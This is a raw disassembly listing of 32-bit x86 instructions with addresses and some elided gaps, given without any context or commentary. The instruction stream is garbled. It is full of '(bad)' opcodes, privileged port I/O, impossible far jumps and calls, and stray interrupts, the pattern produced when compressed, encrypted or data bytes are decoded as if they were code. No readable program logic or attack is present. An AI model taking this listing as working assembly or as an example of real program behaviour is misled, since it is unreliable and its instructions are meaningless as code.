  4230ef:	mov    ebx,0x9ecbf46e
  4230f4:	fucomi st,st(5)
  4230f6:	xor    edi,DWORD PTR [ebp-0x425fd22a]
  4230fc:	repz inc ebx
  4230fe:	bound  ecx,QWORD PTR [ebx+0x632b43ca]
  423104:	(bad)  
  423105:	dec    edx
  423106:	dec    edx
  423107:	addr16 sbb edx,0x123c5618
  42310e:	add    esi,DWORD PTR [ecx]
  423110:	clc    
  423111:	xchg   esp,eax
  423112:	imul   ebp,DWORD PTR [ecx-0x2],0xe18b32ab
  423119:	das    
  42311a:	push   ebx
  42311b:	or     BYTE PTR [ebx-0x44146e5f],ch
  423121:	cmp    eax,0x51d1a542
  423126:	imul   ebx,edx,0x2c
  423129:	not    BYTE PTR [edx+0xf47d71e]
  42312f:	cmc    
  423130:	inc    esp
  423131:	(bad)  
  423132:	daa    
  423133:	mov    al,ds:0xc09d7d3
  423138:	sub    esi,esi
  42313a:	imul   eax,DWORD PTR [ecx-0x6bc1b524],0x4619aabd
  423144:	and    al,cl
  423146:	inc    ebx
  423147:	mov    al,ds:0x427f9f28
  42314c:	lods   eax,DWORD PTR ds:[esi]
  42314d:	jno    0x4231ca
  42314f:	sti    
  423150:	jle    0x4230eb
  423152:	not    BYTE PTR [ebx+0x1f]
  423155:	imul   ecx,DWORD PTR [ebp-0x7a36be46],0x8832e54
  42315f:	add    BYTE PTR [esi],al
  423161:	push   eax
  423162:	inc    ebp
  423163:	push   ss
  423164:	cmc    
  423165:	in     al,0x86
  423167:	rcr    BYTE PTR [ebp+0x7e],0xee
  42316b:	adc    DWORD PTR [ecx],eax
  42316d:	iret   
  42316e:	mov    dl,0xb1
  423170:	push   edi
  423171:	jns    0x423103
  423173:	xchg   edx,eax
  423174:	xor    ah,dl
  423176:	mov    dl,0xe
  423178:	jmp    0x4496a4cd
  42317d:	shr    ebp,cl
  42317f:	retf   
  423180:	lods   eax,DWORD PTR ds:[esi]
  423181:	add    BYTE PTR [ecx-0x79],ch
  423184:	stc    
  423185:	scas   eax,DWORD PTR es:[edi]
  423186:	int3   
  423187:	(bad)  
  423188:	xor    al,BYTE PTR [esp+ebx*8-0x5f]
  42318c:	loope  0x423180
  42318e:	(bad)  [esi]
  423190:	jecxz  0x4231e0
  423192:	rcr    DWORD PTR [edi+0x38a1055],0x58
  423199:	fimul  DWORD PTR [ecx+ecx*4]
  42319c:	out    0x80,al
  42319e:	ss pop ss
  4231a0:	push   es
  4231a1:	out    dx,eax
  4231a2:	pop    esp
  4231a3:	jne    0x4231e1
  4231a5:	mov    dl,0x3a
  4231a7:	jno    0x423132
  4231a9:	shr    BYTE PTR [ebx+0x10],0x8d
  4231ad:	rcl    ebx,1
  4231af:	and    al,0xaa
  4231b1:	mov    edi,edi
  4231b3:	inc    esi
  4231b4:	sar    bh,1
  4231b6:	xor    al,BYTE PTR [eax-0x199b0428]
  4231bc:	adc    BYTE PTR [edx],ch
  4231be:	stc    
  4231bf:	imul   edx,DWORD PTR [ecx+0x0],0x0
	...
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x3f34ccb0
  423243:	out    0x4,al
  423245:	ja     0x423248
  423247:	add    ch,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [esi+0x4cdca78a],ah
  423251:	push   ecx
  423252:	push   edx
  423253:	xchg   ecx,eax
  423254:	xchg   ebx,eax
  423255:	into   
  423256:	fwait
  423257:	cmp    BYTE PTR [ebx],al
  423259:	push   0x8ea7f649
  42325e:	mov    ds:0x39eecc7e,al
  423263:	(bad)  
  423264:	mov    ecx,0x8fda7e89
  423269:	mov    edi,0xe4176e20
  42326e:	mov    bh,0xbe
  423270:	cwde   
  423271:	into   
  423272:	lods   al,BYTE PTR ds:[esi]
  423273:	mov    ds:0x4c86e481,eax
  423278:	push   ecx
  423279:	outs   dx,BYTE PTR ds:[esi]
  42327a:	push   0x65721117
  42327f:	mov    ch,bl
  423281:	pop    esi
  423282:	call   0x9:0x7b239f4d
  423289:	in     eax,0x64
  42328b:	dec    esi
  42328c:	mov    ch,0xa5
  42328e:	or     al,BYTE PTR [esi+0x11197cf2]
  423294:	xchg   esi,eax
  423295:	sar    BYTE PTR [ebp-0x7e6091e1],cl
  42329b:	addr16 js 0x4232ea
  42329e:	pop    ss
  42329f:	pop    edi
  4232a0:	inc    eax
  4232a1:	add    bh,BYTE PTR [ecx]
  4232a3:	inc    eax
  4232a4:	adc    edx,DWORD PTR [esi-0x215d9f21]
  4232aa:	mov    WORD PTR [edx-0x7a918414],gs
  4232b0:	pop    esi
  4232b1:	jne    0x423303
  4232b3:	daa    
  4232b4:	inc    ebp
  4232b5:	xor    al,0x11
  4232b7:	pop    ebx
  4232b8:	repz xchg ebp,eax
  4232ba:	push   es
  4232bb:	jb     0x423241
  4232bd:	jecxz  0x42328a
  4232bf:	test   DWORD PTR [esi+edx*4+0x19],edx
  4232c3:	push   0xffffffc9
  4232c5:	mov    DWORD PTR [esi],ebx
  4232c7:	into   
  4232c8:	repz shrd DWORD PTR [edx+edx*4-0x60],edi,0x1
  4232cf:	dec    esi
  4232d0:	(bad)  
  4232d1:	cdq    
  4232d2:	in     eax,0x3d
  4232d4:	fist   DWORD PTR [eax]
  4232d6:	nop
  4232d7:	aas    
  4232d8:	jmp    0x4232b3
  4232da:	push   edi
  4232db:	pop    ds
  4232dc:	and    eax,0xd7c91b07
  4232e1:	pop    edx
  4232e2:	sbb    DWORD PTR ds:0x567284c,esp
  4232e8:	mov    ecx,0xe1e9947c
  4232ed:	or     edi,DWORD PTR [ecx]
  4232ef:	push   esi
  4232f0:	ins    BYTE PTR es:[edi],dx
  4232f1:	push   esi
  4232f2:	jbe    0x423357
  4232f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232f5:	push   esi
  4232f6:	loop   0x423292
  4232f8:	mov    DWORD PTR [esi+0x4e9189b1],ecx
  4232fe:	inc    esi
  4232ff:	dec    esp
  423300:	ret    
  423301:	rcr    DWORD PTR [edi],1
  423303:	stc    
  423304:	sbb    DWORD PTR [edx-0x30b30626],eax
  42330a:	inc    esp
  42330b:	dec    ebx
  42330c:	inc    esp
  42330d:	int3   
  42330e:	xor    esi,DWORD PTR [ecx+eiz*4]
  423311:	add    dh,cl
  423313:	adc    DWORD PTR [ebx+0x7ac9d996],eax
  423319:	lods   al,BYTE PTR ds:[esi]
  42331a:	and    DWORD PTR [edx-0x50],ecx
  42331d:	mov    bh,ah
  42331f:	clc    
  423320:	js     0x42330f
  423322:	pop    esp
  423323:	cmp    al,0x77
  423325:	fwait
  423326:	xor    ecx,DWORD PTR [edi]
  423328:	mov    al,ds:0xc4f607f2
  42332d:	ret    0x78e9
  423330:	and    DWORD PTR [edi+0x4608f0e1],eax
  423336:	add    eax,0x3028534c
  42333b:	xchg   BYTE PTR [edi+ecx*4+0x4d],al
  42333f:	ret    
  423340:	and    DWORD PTR [eax],eax
	...
  4233b2:	add    BYTE PTR [eax],al
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	fcomi  st,st(4)
  4233c2:	or     cl,0xf9
  4233c5:	ja     0x4233c8
  4233c7:	add    ch,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [edi+edi*4+0x708a8f68],al
  4233d2:	jb     0x423371
  4233d4:	aaa    
  4233d5:	outs   dx,DWORD PTR ds:[esi]
  4233d6:	jmp    0x42342e
  4233d8:	mov    bh,0xa9
  4233da:	shr    BYTE PTR [edx+0x36],0x2e
  4233de:	push   ss
  4233df:	pminsw mm5,QWORD PTR [eax+0x24]
  4233e3:	ret    0x9aae
  4233e6:	sbb    edi,edi
  4233e8:	mov    dl,0xdb
  4233ea:	out    dx,al
  4233eb:	daa    
  4233ec:	dec    edi
  4233ed:	jae    0x42342d
  4233ef:	and    ecx,DWORD PTR [edi-0x198c4ad7]
  4233f5:	out    dx,al
  4233f6:	leave  
  4233f7:	popa   
  4233f8:	data16 fidiv DWORD PTR [eax]
  4233fb:	dec    ebx
  4233fc:	or     ecx,eax
  4233fe:	and    al,0xe2
  423400:	xor    DWORD PTR [edx+0x44fad934],ebx
  423406:	mov    edi,esp
  423408:	scas   eax,DWORD PTR es:[edi]
  423409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42340a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42340b:	lahf   
  42340c:	adc    eax,0x3a68fc58
  423411:	jae    0x423407
  423413:	adc    eax,0xf1fcbc45
  423418:	(bad)  
  423419:	loop   0x42348b
  42341b:	inc    esp
  42341c:	in     al,0x7f
  42341e:	fidiv  DWORD PTR [esi-0x2c]
  423421:	mov    edi,0x6c562e20
  423426:	mov    esp,0xffb6405a
  42342b:	mov    bl,0x33
  42342d:	cld    
  42342e:	pop    esp
  42342f:	into   
  423430:	jp     0x42340e
  423432:	sub    al,BYTE PTR [ebx+edx*8+0x1104635a]
  423439:	pop    ss
  42343a:	xor    al,0x3
  42343c:	fwait
  42343d:	xchg   edi,eax
  42343e:	adc    al,0x15
  423440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423441:	test   DWORD PTR [esp+ecx*1-0x23],esp
  423445:	scas   al,BYTE PTR es:[edi]
  423446:	xor    al,0x3a
  423448:	push   esp
  423449:	xor    DWORD PTR [edi],edi
  42344b:	push   cs
  42344c:	jp     0x423495
  42344e:	mov    bl,0x8
  423450:	and    al,0x8d
  423452:	jne    0x42340c
  423454:	jmp    0x84f5:0xc8e285e9
  42345b:	mov    bl,0xbf
  42345d:	lock add dl,0x8a
  423461:	push   esi
  423462:	dec    ecx
  423463:	clc    
  423464:	mov    ebp,0xe464a8b2
  423469:	inc    ecx
  42346a:	lea    ebp,[edi]
  42346c:	inc    esi
  42346d:	push   ecx
  42346e:	mov    bh,0xc
  423470:	pop    esp
  423471:	in     al,dx
  423472:	hlt    
  423473:	or     eax,DWORD PTR [ecx+ebx*8+0x15dda4eb]
  42347a:	sbb    dh,BYTE PTR cs:[ecx+0x47]
  42347e:	outs   dx,BYTE PTR ds:[esi]
  42347f:	int3   
  423480:	sbb    DWORD PTR [ebx-0x51804884],0xffffff86
  423487:	push   ebp
  423488:	jbe    0x42349c
  42348a:	push   ss
  42348b:	adc    bl,BYTE PTR [esi-0x7fd00d54]
  423491:	mov    al,0x46
  423493:	ja     0x4234c8
  423495:	push   eax
  423496:	push   edi
  423497:	inc    ecx
  423498:	cs mov ecx,eax
  42349b:	mov    WORD PTR [ecx+ebx*4],ds
  42349e:	mov    cl,0x2f
  4234a0:	jmp    0x51:0xf2f014a0
  4234a7:	pusha  
  4234a8:	rcr    DWORD PTR [eax+0x17743763],cl
  4234ae:	sti    
  4234af:	adc    BYTE PTR [ebx+0x7d6712d],bh
  4234b5:	sar    dh,0xac
  4234b8:	outs   dx,BYTE PTR ds:[esi]
  4234b9:	mov    dl,0x3a
  4234bb:	push   es
  4234bc:	add    edx,DWORD PTR [eax-0xd]
  4234bf:	jmp    0x0:0xad
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x99
  423541:	mov    ebx,0x78ee65a7
  423546:	add    DWORD PTR [eax],eax
  423548:	cmc    
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [ecx],bh
  42354d:	pop    edx
  42354e:	mov    al,0x6f
  423550:	lock jne 0x4235a3
  423553:	or     dh,ah
  423555:	sub    dl,ch
  423557:	jmp    0x42a8015f
  42355c:	sub    ch,BYTE PTR [edi]
  42355e:	outs   dx,DWORD PTR ds:[esi]
  42355f:	mov    ds:0x280232c0,al
  423564:	mov    edi,0xf15bb443
  423569:	xchg   edx,eax
  42356a:	inc    ebp
  42356b:	pop    ecx
  42356c:	adc    al,BYTE PTR [eax]
  42356e:	xor    edx,DWORD PTR [edx+0x3f]
  423571:	sbb    eax,0x687118ee
  423576:	sar    ebx,0x4a
  423579:	push   edx
  42357a:	xchg   BYTE PTR [eax],ch
  42357c:	sti    
  42357d:	aaa    
  42357e:	ret    0xaa9f
  423581:	neg    DWORD PTR [ebp-0x45]
  423584:	jmp    0x4235f2
  423586:	cmp    eax,0xe6b82364
  42358b:	jns    0x423550
  42358d:	adc    DWORD PTR [edi-0x39],ebx
  423590:	lds    eax,FWORD PTR [eax]
  423592:	cmp    ah,BYTE PTR [ebp+esi*4+0x5e]
  423596:	cmp    eax,0x3210bda0
  42359b:	and    BYTE PTR [ebp-0x5e],0x7f
  42359f:	mov    eax,0xd72b012
  4235a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235a5:	or     BYTE PTR [eax+0x38],cl
  4235a8:	push   ss
  4235a9:	test   ecx,esp
  4235ab:	add    bh,BYTE PTR ds:0x91cf0144
  4235b1:	jae    0x423627
  4235b3:	mov    DWORD PTR [ebx+0x23],edi
  4235b6:	jl     0x42356e
  4235b8:	fcmovne st,st(0)
  4235ba:	jb     0x423554
  4235bc:	push   ss
  4235bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235be:	jns    0x423574
  4235c0:	sbb    al,0x75
  4235c2:	adc    ah,BYTE PTR [ecx-0x26ebb1c7]
  4235c8:	and    ecx,DWORD PTR [ecx]
  4235ca:	cld    
  4235cb:	aam    0x78
  4235cd:	fst    DWORD PTR [eax]
  4235cf:	add    edi,DWORD PTR [ebx+0x33fcccbd]
  4235d5:	popf   
  4235d6:	dec    edi
  4235d7:	(bad)  
  4235d8:	jne    0x4235f8
  4235da:	mov    esi,0x6794dd34
  4235df:	cmp    DWORD PTR [eax+0x534f927f],esi
  4235e5:	gs xor eax,0xe4425d8f
  4235eb:	(bad)  
  4235ec:	jae    0x42360c
  4235ee:	xor    al,0xca
  4235f0:	stos   BYTE PTR es:[edi],al
  4235f1:	add    al,0xd9
  4235f3:	loopne 0x4235d2
  4235f5:	leave  
  4235f6:	int    0x91
  4235f8:	ficom  WORD PTR [esi]
  4235fa:	aad    0x70
  4235fc:	mov    ecx,0xbd9767ad
  423601:	bound  edi,QWORD PTR [ebx+0x5ae7403e]
  423607:	jno    0x423676
  423609:	push   eax
  42360a:	loop   0x4235b2
  42360c:	jno    0x4235da
  42360e:	dec    ebp
  42360f:	or     DWORD PTR [esi+0x67f60986],esp
  423615:	retf   
  423616:	int    0x2e
  423618:	xchg   ebp,eax
  423619:	test   BYTE PTR [ecx],0xf7
  42361c:	fsub   QWORD PTR [ecx]
  42361e:	fwait
  42361f:	mov    BYTE PTR [ebx+0x6f],0xa4
  423623:	mov    bh,BYTE PTR [ebp+0x3]
  423626:	sar    BYTE PTR [edi],0xad
  423629:	and    ebx,DWORD PTR [ecx+0x387d1da]
  42362f:	lock fmul st,st(1)
  423632:	mov    esp,0x128e0438
  423637:	cwde   
  423638:	ins    BYTE PTR es:[edi],dx
  423639:	rcl    DWORD PTR [edi+edi*4],0x8
  42363d:	mov    edx,0x832f47
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm2,QWORD PTR [esi-0x1cec6935]
  4236c5:	jns    0x4236c8
  4236c7:	add    ch,dh
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    BYTE PTR [ecx],bl
  4236cd:	call   0xc53f:0x3c5e099d
  4236d4:	xchg   WORD PTR [eax+0x5f],sp
  4236d8:	int    0x6a
  4236da:	xchg   edi,eax
  4236db:	js     0x423719
  4236dd:	jne    0x4236f3
  4236df:	int3   
  4236e0:	and    dl,BYTE PTR [eax+0x74]
  4236e3:	push   es
  4236e4:	jnp    0x42366b
  4236e6:	icebp  
  4236e7:	push   edx
  4236e8:	pop    esp
  4236e9:	repnz out 0x38,al
  4236ec:	and    DWORD PTR [ebx],ebp
  4236ee:	ficom  WORD PTR [edx+0xa]
  4236f1:	scas   al,BYTE PTR es:[edi]
  4236f2:	pop    esi
  4236f3:	out    dx,eax
  4236f4:	inc    ebp
  4236f5:	jl     0x42376f
  4236f7:	cwde   
  4236f8:	lea    ecx,[esi-0xdbe0878]
  4236fe:	cmp    BYTE PTR [ebp+0x3b95edeb],ch
  423704:	add    eax,0x24a01bd7
  423709:	dec    ebx
  42370a:	xor    al,0x4
  42370c:	xor    DWORD PTR [edx],edi
  42370e:	or     al,0xc5
  423710:	cli    
  423711:	repz test BYTE PTR [eax-0x2edaef81],ah
  423718:	in     al,0xf0
  42371a:	dec    ebx
  42371b:	gs lock pusha 
  42371e:	add    eax,0xb158735c
  423723:	jmp    0x4236be
  423725:	icebp  
  423726:	pop    esp
  423727:	aam    0xc4
  423729:	adc    eax,0x92ac672c
  42372e:	repz xor eax,0x5e8289b4
  423734:	bound  edx,QWORD PTR [edx-0x2aec6a61]
  42373a:	sbb    al,BYTE PTR [edx+0x1d1435bc]
  423740:	push   eax
  423741:	dec    ecx
  423742:	pop    edx
  423743:	retf   0xec6b
  423746:	mov    ebx,0x921bb1c5
  42374b:	xor    ebp,DWORD PTR [ecx-0x50]
  42374e:	sub    esp,DWORD PTR [edi-0x1b]
  423751:	add    eax,0xd6b8e457
  423756:	mov    ds:0xf5c2169b,eax
  42375b:	lock out dx,eax
  42375d:	test   eax,0x74a2136a
  423762:	push   0x69
  423764:	stc    
  423765:	jmp    DWORD PTR [edi+ebx*4-0x483748d3]
  42376c:	pop    es
  42376d:	fwait
  42376e:	pop    ds
  42376f:	xchg   ebx,eax
  423770:	cmp    DWORD PTR [ecx+0x64],0x198b2ef4
  423777:	(bad)  
  423778:	scas   eax,DWORD PTR es:[edi]
  423779:	popf   
  42377a:	lods   eax,DWORD PTR ds:[esi]
  42377b:	mov    edx,0x69c24d47
  423780:	mov    al,ds:0x3c289ff6
  423785:	(bad)  
  423786:	push   0x9ac1e405
  42378b:	xchg   edx,eax
  42378c:	mov    ah,0xd2
  42378e:	pop    ecx
  42378f:	add    eax,0xc7c02a15
  423794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423795:	sar    DWORD PTR [esi],0x8
  423798:	inc    esi
  423799:	adc    bh,dh
  42379b:	sbb    al,0xc3
  42379d:	jbe    0x4237b0
  42379f:	test   al,0xff
  4237a1:	push   cs
  4237a2:	and    al,BYTE PTR [edx+0x2cdcba13]
  4237a8:	enter  0x61b6,0xba
  4237ac:	or     al,0x51
  4237ae:	push   edx
  4237af:	push   ebx
  4237b0:	xchg   ecx,eax
  4237b1:	aad    0x21
  4237b3:	gs (bad) 
  4237b5:	call   0xc2666a5f
  4237ba:	inc    dl
  4237bc:	in     al,0x99
  4237be:	and    eax,0x9c03
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	ds inc edx
  423842:	xor    BYTE PTR [edi],cl
  423844:	fdivr  DWORD PTR [edx+0x1]
  423847:	add    ch,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [edi],dl
  42384d:	test   BYTE PTR [esi+0xf],dh
  423850:	in     al,dx
  423851:	shl    DWORD PTR [ebx+0x4a],cl
  423854:	sbb    eax,0x2d46bd72
  423859:	adc    eax,0x3ba543eb
  42385e:	(bad)  
  42385f:	xchg   edi,eax
  423860:	scas   eax,DWORD PTR es:[edi]
  423861:	mov    eax,0xe67962c9
  423866:	dec    esp
  423867:	xor    ch,BYTE PTR [ecx+0x2b]
  42386a:	leave  
  42386b:	add    eax,0xe9ed0a17
  423870:	push   ebp
  423871:	xchg   edi,eax
  423872:	and    ebp,ebp
  423874:	loop   0x423845
  423876:	mov    ds:0x4d51b724,al
  42387b:	jnp    0x423880
  42387d:	mov    eax,0x2c418bdd
  423882:	ret    0xa9c1
  423885:	fist   DWORD PTR [ecx-0x328c8961]
  42388b:	jae    0x4238d1
  42388d:	mov    ebp,fs
  42388f:	mov    esp,DWORD PTR [eax+esi*4+0x1338bc33]
  423896:	in     eax,0x9a
  423898:	sub    BYTE PTR [ebx],ah
  42389a:	pop    ecx
  42389b:	cmp    DWORD PTR [esi+0xa],esi
  42389e:	(bad)  
  42389f:	dec    esi
  4238a0:	jo     0x423876
  4238a2:	ins    DWORD PTR es:[edi],dx
  4238a3:	repnz mov ebx,0x52736b3b
  4238a9:	scas   al,BYTE PTR es:[edi]
  4238aa:	sub    bh,BYTE PTR [esi+eiz*4+0x3]
  4238ae:	and    ebp,ebx
  4238b0:	or     al,0xa0
  4238b2:	pop    ebp
  4238b3:	sub    BYTE PTR [ebx],ch
  4238b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b6:	push   eax
  4238b7:	ja     0x42384d
  4238b9:	call   0xfa60eaba
  4238be:	push   ecx
  4238bf:	retf   0x5e93
  4238c2:	jp     0x4238c6
  4238c4:	data16 (bad) [esp+esi*1+0x32df6a61]
  4238cc:	mov    ds:0xff4fe88d,al
  4238d1:	(bad)  
  4238d2:	mov    ebx,0x2a8e7218
  4238d7:	add    eax,0x134ab619
  4238dc:	test   al,0x2c
  4238de:	std    
  4238df:	xor    al,0x8b
  4238e1:	push   ebx
  4238e2:	pop    ds
  4238e3:	mov    ebp,0x1cbff767
  4238e8:	pop    ecx
  4238e9:	xchg   BYTE PTR [ecx+0x69],dl
  4238ec:	cmp    esi,ebx
  4238ee:	aam    0xb9
  4238f0:	mov    ebx,0x1604d46e
  4238f5:	jcxz   0x4238a3
  4238f8:	xor    al,0xa5
  4238fa:	adc    ebx,DWORD PTR [esi+0x9]
  4238fd:	call   0xdd331bf3
  423902:	xor    edi,0x2ade01c8
  423908:	xchg   ebx,eax
  423909:	mov    ebx,0x41540339
  42390e:	lahf   
  42390f:	add    BYTE PTR [ebx+0x28dd7000],bl
  423915:	ss pop ebx
  423917:	in     al,0x23
  423919:	das    
  42391a:	outs   dx,DWORD PTR ds:[esi]
  42391b:	dec    ebp
  42391c:	mov    ss,WORD PTR [edx+0x1e93fbc7]
  423922:	sahf   
  423923:	ds aam 0x48
  423926:	dec    edx
  423927:	(bad)
  42392b:	mov    ebp,0xb8d4eca8
  423930:	fisubr DWORD PTR es:[edx-0x55]
  423934:	jnp    0x42397d
  423936:	jb     0x423988
  423938:	adc    eax,0x34ffee35
  42393d:	neg    DWORD PTR ds:0x533a
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [eax+0x41],es
  4239c2:	mov    cl,0xe2
  4239c4:	int    0x7b
  4239c6:	add    DWORD PTR [eax],eax
  4239c8:	cmc    
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    ch,ch
  4239cd:	test   eax,0xa9c703d6
  4239d2:	daa    
  4239d3:	xor    bh,dl
  4239d5:	jbe    0x423a03
  4239d7:	std    
  4239d8:	daa    
  4239d9:	pop    ebp
  4239da:	xchg   ebp,eax
  4239db:	push   ss
  4239dc:	and    edi,esi
  4239de:	inc    ebx
  4239df:	rol    BYTE PTR [edi+0x82a017f],1
  4239e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239e6:	imul   ebx,ecx,0xffffff85
  4239e9:	call   0x9b6d4a78
  4239ee:	lods   al,BYTE PTR ds:[esi]
  4239ef:	cdq    
  4239f0:	mov    ds:0x8e3df5bc,eax
  4239f5:	ret    
  4239f6:	daa    
  4239f7:	dec    eax
  4239f8:	test   DWORD PTR [esi+0x3f],esi
  4239fb:	push   0x81200bad
  423a00:	imul   edi,DWORD PTR [esi-0x79],0x3e
  423a04:	xchg   esi,eax
  423a05:	sub    BYTE PTR [ebp-0x3d],ch
  423a08:	js     0x423a6e
  423a0a:	sbb    ah,BYTE PTR [ebp+0x4a]
  423a0d:	clc    
  423a0e:	jno    0x4239b8
  423a10:	ror    BYTE PTR [eax+ebx*8-0x3fc60e90],cl
  423a17:	sub    BYTE PTR [edx-0x1c],al
  423a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a1b:	(bad)  
  423a1c:	(bad)  
  423a1d:	mov    dl,0x1b
  423a1f:	pusha  
  423a20:	mov    esi,0xce154cf9
  423a25:	loop   0x4239d9
  423a27:	call   0xc15bf215
  423a2c:	retf   0xf7db
  423a2f:	push   ecx
  423a30:	ins    BYTE PTR es:[edi],dx
  423a31:	and    ah,BYTE PTR [ebx]
  423a33:	jmp    0xbeeb293c
  423a38:	rcl    BYTE PTR [ebp-0xa],1
  423a3b:	mov    al,0xbd
  423a3d:	retf   
  423a3e:	mov    esp,0x60b8d9c
  423a43:	or     cl,BYTE PTR [edx-0x31cddea6]
  423a49:	fidivr WORD PTR [ebx]
  423a4b:	inc    ebp
  423a4c:	jae    0x4239eb
  423a4e:	cmp    eax,0x3841edf2
  423a53:	ins    DWORD PTR es:[edi],dx
  423a54:	mov    dh,0x82
  423a56:	into   
  423a57:	or     dh,dl
  423a59:	call   0x29691b6
  423a5e:	xchg   ecx,eax
  423a5f:	xchg   ecx,eax
  423a60:	and    al,0xa7
  423a62:	jbe    0x423a5f
  423a64:	mov    ds:0x2f6468d1,eax
  423a69:	adc    al,0x3
  423a6b:	in     eax,0xb
  423a6d:	cld    
  423a6e:	fimul  DWORD PTR [eax+0x7958847]
  423a74:	iret   
  423a75:	or     edi,DWORD PTR [edx-0x183c6547]
  423a7b:	mov    ch,0xe2
  423a7d:	sub    al,0x6f
  423a7f:	dec    DWORD PTR [ebp+ebx*4-0x26]
  423a83:	lods   eax,DWORD PTR ds:[esi]
  423a84:	push   eax
  423a85:	mov    esp,0xa5aae29f
  423a8a:	fcomip st,st(0)
  423a8c:	lea    esp,[eax]
  423a8e:	mov    bl,0xa0
  423a90:	dec    eax
  423a91:	inc    edi
  423a92:	outs   dx,BYTE PTR ds:[esi]
  423a93:	jb     0x423adb
  423a95:	and    DWORD PTR [ecx+ebp*4-0x9bf9b1a],esi
  423a9c:	xlat   BYTE PTR ds:[ebx]
  423a9d:	in     al,0x3b
  423a9f:	sahf   
  423aa0:	rol    BYTE PTR ds:0x5d146fe,1
  423aa6:	outs   dx,BYTE PTR ds:[esi]
  423aa7:	lock sbb BYTE PTR [edx+edi*2+0x237c00ea],bh
  423aaf:	(bad)  
  423ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ab1:	mov    dl,0xa4
  423ab3:	mov    BYTE PTR [esp+edx*4+0x27],bh
  423ab7:	retf   0x1c91
  423aba:	inc    edi
  423abb:	hlt    
  423abc:	sahf   
  423abd:	mov    ah,0x20
  423abf:	ret    0xc1
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0xc4
  423b41:	sti    
  423b42:	xchg   BYTE PTR [ecx-0x3e],bh
  423b45:	jl     0x423b48
  423b47:	add    ch,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [ebx+edi*1+0x3d],ch
  423b4f:	jo     0x423af7
  423b51:	lahf   
  423b52:	fsubp  st(6),st
  423b54:	xchg   BYTE PTR ds:0xf69cfdeb,dh
  423b5a:	mov    bl,0x26
  423b5c:	xchg   ecx,eax
  423b5d:	xchg   BYTE PTR [ebx+ebx*8],bl
  423b60:	push   ebx
  423b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b62:	fldenv [esi+0x7d3d0f87]
  423b68:	jno    0x423b39
  423b6a:	add    ebx,DWORD PTR [edx+0x76]
  423b6d:	sbb    ah,BYTE PTR [esi+0xf]
  423b70:	sahf   
  423b71:	outs   dx,DWORD PTR ds:[esi]
  423b72:	fdivp  st(2),st
  423b74:	test   DWORD PTR [ebp-0x1b7488e],0x9a051f01
  423b7e:	xor    al,0xd8
  423b80:	sti    
  423b81:	xor    ecx,ebp
  423b83:	aad    0x17
  423b85:	push   ebp
  423b86:	adc    esp,DWORD PTR [edi-0x293f0d3f]
  423b8c:	jbe    0x423baa
  423b8e:	lahf   
  423b8f:	int3   
  423b90:	scas   eax,DWORD PTR es:[edi]
  423b91:	ins    DWORD PTR es:[edi],dx
  423b92:	sub    BYTE PTR [esi],bl
  423b94:	push   edx
  423b95:	sbb    al,0xcc
  423b97:	pop    ebp
  423b98:	jg     0x423b9b
  423b9a:	call   0xad98:0xcf787585
  423ba1:	retf   
  423ba2:	dec    edi
  423ba3:	hlt    
  423ba4:	aaa    
  423ba5:	out    dx,al
  423ba6:	pop    es
  423ba7:	(bad)  
  423ba8:	ins    BYTE PTR es:[edi],dx
  423ba9:	fdivr  st,st(4)
  423bab:	iret   
  423bac:	mov    ah,0x82
  423bae:	jae    0x423c1e
  423bb0:	mov    al,ds:0x8d2d7213
  423bb5:	test   BYTE PTR [ebp+0x29],al
  423bb8:	pop    ebx
  423bb9:	out    dx,al
  423bba:	push   ss
  423bbb:	mov    gs,WORD PTR [ecx+0x3c7f4b3f]
  423bc1:	mov    al,0xc2
  423bc3:	(bad)
  423bc7:	outs   dx,DWORD PTR ds:[esi]
  423bc8:	mov    ds:0xfc2eb320,eax
  423bcd:	pop    edi
  423bce:	or     DWORD PTR [ecx],eax
